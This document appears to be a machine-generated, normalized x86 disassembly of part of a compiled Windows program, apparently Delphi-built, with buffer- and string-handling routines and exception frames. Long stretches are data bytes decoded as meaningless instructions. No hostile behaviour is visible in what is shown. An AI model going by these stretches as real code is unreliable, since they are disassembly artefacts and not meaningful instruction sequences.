and al 0x52
inc edi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push edx
jo r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
push edx
inc edi
jns r-xdata
fimul [ ebx - 0x742dcc10 ]
outsd
jb r-xdata
inc edi
add [ ebx + edx * 2 ] bh
inc edi
add [ eax - 0x6fffb8aa ] dh
xor al [ eax ]
test al 0x54
inc edi
add [ eax ] bl
push ebp
inc edi
add [ eax + 0xe004756 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add [ eax ] cl
push esp
dec ecx
push edx
add [ ebx + edx * 2 ] ah
push ecx
inc edi
add [ eax ] dh
inc esp
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
push edx
jo r-xdata
push ebp
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040001 ] al
js r-xdata
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
or eax 0x52644945
jo r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
jns r-xdata
shl [ edi + ebx - 0x75 ] 0xc6
int3
mov edx esi
mov eax ebx
call sub_416eac
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0xc ]
mov eax esi
call sub_475584
pop esi
pop ebx
retn
mov eax esi
adc [ eax ] al
or al 0x0
add bh bh
test [ ebp + 0x47 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43040000 ] al
outsd
adc al 0x47
inc ecx
add [ eax ] bl
add [ eax ] al
dec [ eax ]
add [ eax + 0xc004010 ] dh
add [ eax ] al
inc [ ebp + edx * 2 + 0x10047 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x43
sub_475281
push edx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
push edx
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
or eax 0x52644945
jo r-xdata
or [ ebx + 0x3be8f0c4 ] al
out dx eax
clc
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x1dcee8c6 ] cl
cli
dec [ ebx + 0x46890845 ]
adc al 0x8b
jns r-xdata
pop esi
pop ebx
retn
jb r-xdata
fimul [ ebx - 0x742dcc10 ]
outsd
jb r-xdata
push ebp
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040001 ] al
js r-xdata
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
shl [ edi + ebx - 0x75 ] 0xc6
int3
mov edx esi
mov eax ebx
call sub_416eac
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0xc ]
mov eax esi
call sub_475584
pop esi
pop ebx
retn
mov eax esi
sub_4752e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0xc ]
mov eax esi
call sub_475584
pop esi
pop ebx
retn
sub_475384
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_417128
mov eax esi
call sub_475400
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4753c0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x18 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x10 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417160
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_475424
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47548f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
call sub_404e98
push [ ebx + 0xc ]
push r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4051e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475496
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4754b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4754fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4625b0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_475584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475503
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_475518
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475565
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4625b0
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47556c
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_475584
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47565d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx esi
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475664
lea eax [ ebp - 0x14 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x10 ]
mov eax [ r-xdata ]
pop edx
call sub_4624e8
mov eax [ ebp - 0x4 ]
push eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ r-xdata ]
pop ecx
call sub_46325c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
lea eax [ ebx + 0xc ]
mov edx esi
call sub_404e98
xor ecx ecx
mov edx esi
mov edi [ eax ]
call [ edi + 0x2c ]
mov edi eax
lea eax [ ebp - 0x14 ]
mov ecx esi
mov edx r-xdata
call sub_405170
mov ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ r-xdata ]
call sub_463250
sub_47568e
add [ eax ] al
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
call sub_475584
mov edx edi
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop edi
pop esi
retn
sub_4756d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x57
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] al
dec esi
outsd
je r-xdata
inc ecx
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
outsb
outsd
jne r-xdata
add al dl
aaa
inc esi
add [ eax + eax ] al
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push 0x61746144
dec ecx
dec ebp
jne r-xdata
push 0x61746144
dec ecx
outsb
inc edx
call sub_404e44
retn
jb r-xdata
inc edx
jne r-xdata
jb r-xdata
outsb
inc edx
jne r-xdata
jb r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475878
lea eax [ ebp - 0x4 ]
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475871
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov eax 0x7fffffff
sub eax esi
jno r-xdata
jne r-xdata
in al dx
push edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
push edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
push edi
inc edi
add [ eax + eax ] ah
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ch
pop ecx
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
adc bh bh
push edx
inc esp
mov eax [ ebx + 0x10 ]
pop ebx
retn
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
push ss
inc ebp
dec ecx
push esp
outsd
outsd
inc eax
add [ edi + edx * 2 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x47 ] dl
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
add edi [ ebx + 0x20 ]
jno r-xdata
call sub_403e34
cmp eax edi
setl dl
mov eax [ r-xdata ]
call sub_46328c
xor eax eax
pop edx
call sub_403e34
sub_475808
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475871
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov eax 0x7fffffff
sub eax esi
jno r-xdata
add edi [ ebx + 0x20 ]
jno r-xdata
call sub_403e34
cmp eax edi
setl dl
mov eax [ r-xdata ]
call sub_46328c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475878
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_403e34
sub_475880
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47593f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0xffffffff
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
push [ ebp - 0x8 ]
push r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebx + 0x20 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x6
call sub_4051e4
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
add edi [ ebx + 0x20 ]
jno r-xdata
add edi [ ebx + 0x20 ]
jno r-xdata
cmp eax edi
setg dl
mov eax [ r-xdata ]
call sub_46328c
call sub_403e34
mov [ esi ] edi
jmp r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475946
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
sub_475974
push ebx
mov ebx eax
push 0x0
lea eax [ ebx + 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax [ ebx + 0x4 ]
call sub_406248
mov [ ebx + 0x20 ] eax
pop ebx
retn
sub_4759a4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475fc0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4759ec
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_475974
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
mov eax [ r-xdata ]
call sub_46f7f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_475a24
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx ecx
xor ecx ecx
push ebp
push sub_475a89
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp edx 0xffffffff
jne r-xdata
test edx edx
jle r-xdata
mov edx [ eax + 0x20 ]
mov eax ebx
call sub_404e44
push 0x1
push 0xffffffff
lea ecx [ ebp - 0x4 ]
xchg edx ecx
call sub_475a94
push ebx
mov ecx 0x7fffffff
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475a90
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_475a94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax esi
cdq
push edx
push eax
push 0x0
push 0x0
call sub_4645ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
call sub_403e2c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
lea edx [ ebp - 0x8 ]
mov ecx eax
mov eax ebx
call sub_475880
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_406248
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_406248
mov edi eax
mov eax [ ebp - 0x8 ]
add eax edi
jno r-xdata
test esi esi
jge r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push eax
mov eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
jmp r-xdata
call sub_403e34
push edi
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_463a00
push edi
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_463a00
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_475c8c
jmp r-xdata
sub_475b88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_475c7b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax esi
cdq
push edx
push eax
push 0x0
push 0x0
call sub_4645ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0xc ] eax
mov edi eax
test esi esi
jge r-xdata
call sub_403e2c
lea edx [ ebp - 0xc ]
mov ecx edi
mov eax ebx
call sub_475880
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_463a00
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_463610
mov dl 0x1
mov eax ebx
call sub_475cdc
lea edx [ ebp - 0xc ]
mov ecx edi
mov eax ebx
call sub_475880
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_463610
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_475c8c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475c82
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_475c8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jl r-xdata
add [ ebx + 0x10 ] esi
jno r-xdata
mov eax ebx
call sub_475974
jmp r-xdata
sub [ ebx + 0x20 ] esi
jno r-xdata
call sub_403e34
cmp [ ebx + 0x1a ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebx + 0xc ]
jle r-xdata
call sub_403e34
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov dl 0x1
mov eax ebx
call sub_475cdc
sub_475cdc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx [ esi + 0x20 ]
push edx
lea ecx [ esi + 0x4 ]
mov edx eax
mov eax [ esi + 0x4 ]
call sub_463a00
xor eax eax
mov [ esi + 0x10 ] eax
test bl bl
je r-xdata
mov eax esi
call sub_475fb4
sub eax [ esi + 0x20 ]
jno r-xdata
sub eax [ esi + 0x10 ]
jno r-xdata
call sub_403e34
cmp eax [ esi + 0xc ]
jle r-xdata
call sub_403e34
mov eax [ esi + 0x10 ]
add eax [ esi + 0x20 ]
jno r-xdata
add eax [ esi + 0xc ]
jno r-xdata
call sub_403e34
push eax
lea eax [ esi + 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
call sub_403e34
sub_475d58
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406474
xor eax eax
push ebp
push sub_475dac
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov eax [ ebp - 0x4 ]
call sub_406248
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_476014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475db3
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_475db8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475e0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_4646f0
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_475e1c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e11
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_475e1c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_475fa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0xffffffff
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475fab
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_404e68
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_406248
test eax eax
sete dl
mov eax [ r-xdata ]
pop ecx
call sub_46328c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax 0x1
jno r-xdata
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x24 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ r-xdata ]
call sub_463274
mov eax [ ebp - 0x8 ]
call sub_406248
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x20 ]
jno r-xdata
call sub_403e34
mov [ ebp - 0x10 ] edx
mov ecx eax
add ecx ebx
jno r-xdata
call sub_403e34
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
jno r-xdata
call sub_403e34
sub eax ecx
jl r-xdata
call sub_403e34
inc eax
mov [ ebp - 0x1c ] eax
test edx edx
jl r-xdata
call sub_403e34
cmp [ ebp - 0x15 ] 0x0
je r-xdata
inc edx
xor eax eax
inc ecx
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx ecx
sub edx [ eax + 0x10 ]
jno r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
call sub_403e34
mov [ ebp - 0x15 ] 0x1
mov edx [ ebp - 0x14 ]
sub edx 0x1
jno r-xdata
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
call sub_403e34
mov ebx eax
add ebx ecx
jno r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ebx [ esi - 0x4 ]
jb r-xdata
movzx ebx [ esi + ebx ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
cmp bl [ esi + eax ]
je r-xdata
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x15 ] 0x0
jmp r-xdata
mov ebx eax
add ebx ecx
jno r-xdata
sub_475fc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] 0x800
mov eax esi
call sub_475974
mov eax [ r-xdata ]
call sub_46f858
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_476014
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406474
xor eax eax
push ebp
push sub_476198
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
cdq
push edx
push eax
push 0x0
push 0x0
call sub_4645ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov edi eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_475808
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
call sub_403e2c
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push edi
push esi
lea ecx [ ebx + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
cmp edi [ ebx + 0x20 ]
jl r-xdata
xor edx edx
mov eax ebx
call sub_475cdc
mov eax ebx
call sub_475fb4
mov edi [ ebx + 0x20 ]
sub eax edi
jno r-xdata
mov eax [ ebp - 0x4 ]
call sub_406248
mov edi eax
add edi [ ebp + 0x8 ]
jno r-xdata
lea eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ r-xdata ]
call sub_40644c
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x20 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47619f
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
add edi esi
jno r-xdata
sub eax [ ebx + 0x10 ]
jno r-xdata
call sub_403e34
mov [ ebx + 0x20 ] edi
push edi
lea eax [ ebx + 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
push esi
lea ecx [ ebx + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
jmp r-xdata
call sub_403e34
mov [ ebx + 0x20 ] edi
call sub_403e34
cmp esi eax
jle r-xdata
call sub_403e34
mov eax [ ebx + 0x10 ]
add eax [ ebx + 0x20 ]
jno r-xdata
add edi esi
jno r-xdata
push eax
push esi
lea ecx [ ebx + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
add [ ebx + 0x20 ] esi
jno r-xdata
call sub_403e34
add edi [ ebx + 0xc ]
jno r-xdata
call sub_403e34
jmp r-xdata
call sub_403e34
push edi
lea eax [ ebx + 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
call sub_403e34
sub_4761a9
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
popad
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] al
dec ecx
outsb
je r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
arpl [ edi ] ax
pushad
add [ eax ] al
add [ eax + 0x4f ] ch
inc esi
add al ch
jo r-xdata
jo r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
